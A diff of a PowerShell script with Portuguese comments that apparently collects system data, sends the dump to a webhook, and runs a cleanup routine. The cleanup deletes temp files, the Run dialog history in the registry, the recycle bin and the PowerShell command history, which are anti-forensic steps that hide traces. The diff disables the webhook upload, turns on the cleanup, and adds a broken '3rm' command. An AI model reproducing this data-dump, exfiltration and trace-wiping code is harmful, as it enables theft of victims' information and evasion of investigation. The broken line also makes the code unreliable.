@@ -1014,7 +1014,7 @@ function Send-DumpToWebhook {
 ##### Funcao de Limpeza ####
 function Clear-All {
     $ea = 'SilentlyContinue'
-    rm "$env:TEMP\*" -r -fo -ea $ea
+    3rm "$env:TEMP\*" -r -fo -ea $ea
     rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
     Clear-RecycleBin -fo -ea $ea
     rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
@@ -1027,13 +1027,13 @@ $out = Invoke-DataDump `
     -OutputFile $OutputFileDefault `
     -ExportDir $ExportDirDefault
 
-Send-DumpToWebhook `
+#Send-DumpToWebhook `
     -FilePath $out `
     -WebhookUrl $WebhookUrl `
     -Title "System Info" `
     -ExportDir $ExportDirDefault `
-    #-RemoveExportDir
+    -RemoveExportDir
 
-#Clear-All
+Clear-All
 
 
